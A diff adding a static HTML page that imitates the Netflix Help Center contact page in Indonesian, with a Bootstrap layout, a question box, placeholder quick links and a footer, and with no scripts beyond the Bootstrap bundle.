@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Help Center</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            color: #fff;
+        }
+        .navbar, .footer {
+            background: #000000;
+        }
+        .footer {
+            color: #ccc;
+            font-size: 0.95em;
+            padding: 30px 0 10px 0;
+            width: 100vw;
+            margin-left: calc(-50vw + 50%);
+            margin-right: calc(-50vw + 50%);
+        }
+        .main-content {
+            background: #fff;
+            color: #222;
+            padding: 2rem;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+        .form-control {
+            background: #f6f6f6;
+        }
+        .lang-select {
+            width: 160px;
+        }
+        .quick-link a {
+            text-decoration: none;
+            color: #333;
+        }
+        .quick-link a:hover {
+            text-decoration: underline;
+        }
+        .btn-netflix {
+            background: #e50914;
+            color: #fff;
+        }
+        .btn-netflix:hover {
+            background: #b0060f;
+        }
+        .arrow-box {
+            position: relative;
+        }
+        .arrow-box:focus-within .arrow-icon {
+            display: inline;
+        }
+        .arrow-icon {
+            font-size: 1.2em;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: none;
+            pointer-events: none;
+        }
+        .footer-link-col {
+            flex-direction: column !important;
+        }
+        .footer a {
+            margin-bottom: 6px;
+        }
+        .divider {
+            margin-bottom: 15px;
+        }
+        .quick-link .link-divider {
+            border-top: 1px solid #e6e6e6;
+            margin: 7px 0 7px 0;
+        }
+        @media (max-width: 576px) {
+            .main-content {
+                padding: 1rem;
+            }
+            .lang-select {
+                width: 100%;
+            }
+        }
+        .vertical-line {
+            display: flex;
+            width: 2px;
+            height: 30px;
+            background-color: #e50914;
+            margin-left: 15px;
+        }
+        .help-text {
+            font-weight: bold;
+            margin-left: 15px;
+        }
+    
+    </style>
+</head>
+<body>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+      <div class="container">
+        <a class="navbar-brand fw-bold d-flex align-items-center" href="#">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" height="30" class="me-2" />
+          <div class="vertical-line">
+            <span class="help-text">Help Center</span>
+          </div>
+        </a>
+        <div class="ms-auto">
+          <button class="btn btn-outline-light me-2">Join Netflix</button>
+          <a href="index.html" class="btn btn-netflix">Sign In</a>
+        </div>
+      </div>
+    </nav>
+
+    <div class="container"> 
+        <div class="main-content">
+            <h2 class="fw-bold mb-3">Contact Us</h2>
+            <p><strong>Tell us more and we'll find the best solution for you</strong></p>
+            <form class="mb-4">
+                <div class="arrow-box">
+                  <input type="text" class="form-control" id="questionBox" placeholder="Describe your issue" tabindex="1">
+                </div>
+            </form>
+            <div>
+                <div class="mb-2 fw-bold">Quick Link</div>
+                <div class="divider"></div>
+                <div class="quick-link mb-3">
+                    <div class="link-divider"></div>
+                    <p><a href="#">Reset password</a></p>
+                    <div class="link-divider"></div>
+                    <p><a href="#"><i class="bi bi-envelope"></i> Update email</a></p>
+                    <div class="link-divider"></div>
+                    <p><a href="#">Get help signing in</a></p>
+                    <div class="link-divider"></div>
+                    <p><a href="#">Update payment method</a></p>
+                    <div class="link-divider"></div>
+                    <p><a href="#">Request TV shows or movies</a></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer mt-4">
+        <div class="container">
+            <div class="mb-3">
+                <select class="form-select lang-select d-inline-block" style="max-width:180px;">
+                    <option>Bahasa Indonesia</option>
+                    <option>English</option>
+                    <option>中文</option>
+                    <option>한국어</option>
+                </select>
+            </div>
+            <div class="d-flex footer-link-col">
+                <a href="#" class="text-decoration-none text-secondary">Terms of Use</a>
+                <a href="#" class="text-decoration-none text-secondary">Privacy</a>
+                <a href="#" class="text-decoration-none text-secondary">Cookie Preference</a>
+                <a href="#" class="text-decoration-none text-secondary">Corporate Information</a>
+            </div>
+        </div>
+    </div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js" integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI" crossorigin="anonymous"></script>
+</body>
+</html>
